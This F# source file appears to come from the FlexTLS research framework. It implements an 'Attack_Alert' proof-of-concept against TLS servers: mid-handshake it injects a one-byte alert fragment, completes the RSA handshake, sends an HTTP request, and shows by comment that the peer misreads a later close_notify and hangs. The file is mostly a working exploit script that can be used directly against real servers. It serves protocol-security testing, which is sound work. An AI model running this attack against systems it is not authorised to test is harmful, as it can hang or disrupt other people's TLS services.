#light "off"

module FlexApps.Attack_Alert

open Bytes
open TLSInfo

open FlexTLS.FlexTypes
open FlexTLS.FlexConnection
open FlexTLS.FlexClientHello
open FlexTLS.FlexServerHello
open FlexTLS.FlexAlert
open FlexTLS.FlexState
open FlexTLS.FlexCertificate
open FlexTLS.FlexServerHelloDone
open FlexTLS.FlexClientKeyExchange
open FlexTLS.FlexCCS
open FlexTLS.FlexFinished
open FlexTLS.FlexAppData
open FlexTLS.FlexSecrets




let httpRequest host =
    sprintf "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\n\r\n" host


let run peer =
    // Connect to the server
    let st,_ = FlexConnection.clientOpenTcpConnection(peer,peer) in

    // Start a typical RSA handshake with the server
    let st,nsc,fch = FlexClientHello.send(st) in
    let st,nsc,fsh = FlexServerHello.receive(st,fch,nsc) in

    // *** Inject a one byte alert on behalf of the attacker ***
    let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in

    // Continue the typical RSA handshake
    let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
    let st,fshd      = FlexServerHelloDone.receive(st) in
    let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,nsc,fch) in
    let st,_         = FlexCCS.send(st) in
            
    // Start encrypting
    let st           = FlexState.installWriteKeys st nsc in
    let log          = fch.payload @| fsh.payload @| fcert.payload @| fshd.payload @| fcke.payload in
            
    let st,cff       = FlexFinished.send(st, logRoleNSC=(log,Client,nsc)) in
    let st,_,_       = FlexCCS.receive(st) in

    // Start decrypting
    let st           = FlexState.installReadKeys st nsc in
    // Check that verify_data is correct
    let vd = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (log @| cff.payload) in
    let st,sff       = FlexFinished.receive(st) in
    if not (vd = sff.verify_data) then
        failwith "Verify_data check failed"
    else

    // RSA handshake is over. Send some plaintext
    let request = httpRequest peer in
    let st = FlexAppData.send(st,request) in
    printf "---> %s" request;
    let st,b = FlexAppData.receive(st) in
    let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
    printf "<--- %s" response;

    // Close a connection by sending a close_notify alert
    let st = FlexAlert.send(st,TLSError.AD_close_notify) in

    (* *** Here we'd expect either a close_notify from the peer,
           or the connection to be shut down.
           However, the peer mis-interpreted our alert, and is now
           waiting for more data. *)
    printf "Sending close notify. Going to hang...\n";
    let st,ad,_ = FlexAlert.receive(st) in
    printf "Alert: %A" ad;
    ignore (System.Console.ReadLine());
    ()
